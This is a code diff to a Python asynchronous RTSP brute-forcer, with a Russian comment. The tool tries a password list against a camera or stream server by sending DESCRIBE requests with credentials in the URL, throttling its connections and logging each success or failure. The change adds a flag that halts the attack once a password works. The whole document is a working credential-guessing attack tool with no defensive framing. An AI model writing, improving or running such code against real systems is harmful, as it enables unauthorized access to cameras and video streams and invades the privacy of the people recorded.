@@ -16,6 +16,7 @@ class RTSPBruteforcer:
         target_parts = self.target.split(":")
         self.target_ip = target_parts[0]
         self.target_port = target_parts[1] if len(target_parts) > 1 else "554"
+        self.password_found = False
 
     async def send_rtsp_request(self, ip, port, request, timeout=10):
         async with self.connections_semaphore:
@@ -35,10 +36,13 @@ class RTSPBruteforcer:
                 return None
 
     async def try_login(self, password):
+        if self.password_found:
+            return False
         request = f"DESCRIBE rtsp://{self.user}:{password}@{self.target_ip}:{self.target_port}/ RTSP/1.0\r\nCSeq: 2\r\n\r\n"
         response = await self.send_rtsp_request(self.target_ip, int(self.target_port), request)
         if response and "401 Unauthorized" not in response:
             print(f"[+] Success: Password found: {password}")
+            self.password_found = True
             return True
         else:
             print(f"[-] Unauthorized for {password}")
@@ -51,6 +55,8 @@ class RTSPBruteforcer:
 
         start_time = time.time()
         for password in passwords:
+            if self.password_found:
+                break
             if len(tasks) >= self.max_connections_per_second:
                 elapsed = time.time() - start_time
                 if elapsed < 1:
@@ -66,7 +72,7 @@ class RTSPBruteforcer:
                 await asyncio.gather(*tasks)
 
         # Ждем завершения оставшихся задач
-        if tasks:
+        if tasks and not self.password_found:
             await asyncio.gather(*tasks)
 
 
